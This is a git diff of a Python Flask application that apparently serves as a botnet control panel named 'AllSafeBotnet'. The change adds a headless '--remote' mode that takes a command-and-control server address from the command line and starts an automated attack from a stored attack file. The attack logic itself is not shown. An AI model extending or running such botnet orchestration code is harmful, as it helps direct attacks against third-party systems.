@@ -6,7 +6,7 @@ Python 3.4.x version of the interpreter.
 Authors:    Alessio "Tyrell" Moretti & Federico "Elliot" Vagnoni
 Version:    0.1.0
 Created:    24 October 2016
-Modified:   14 January 2017
+Modified:   09 February 2017
 """
 
 from flask import Flask
@@ -14,11 +14,16 @@ from flask import render_template
 from flask import request
 from flask import abort
 from flask import redirect
+
 from time import time
+import sys
+
 import requests
 from requests.auth import HTTPBasicAuth
+
 import json
 import Botnet
+
 from collections import OrderedDict
 from utils.config import rootSchema, targetSchema, requestSchema
 
@@ -156,4 +161,16 @@ if __name__ == "__main__":
     print("  - Alessio 'Tyrell' Moretti                                 ")
     print("  - Federico 'Elliot' Vagnoni                                ")
     print("-------------------------------------------------------------")
-    app.run(host='0.0.0.0', port=4042)
+    # check for command line headless mode - autopilot(override=false)
+    if ('--remote' in sys.argv) and (len(sys.argv) >= 3):
+        try:
+            print("[" + str(int(time())) + "]" + "starting headless attack, kill the process to abort...")
+            cc_server = sys.argv[sys.argv.index('--remote') + 1]
+            print("- botnet C&C located at:", cc_server)
+            allsafe = Botnet.AllSafeBotnet()
+            allsafe.autopilot(cc_server, './data/current_attack.json', 5, override=False)
+        except Exception:
+            print("Error entering autopilot mode!")
+            sys.exit(EnvironmentError)
+    else:
+        app.run(host='0.0.0.0', port=4042)
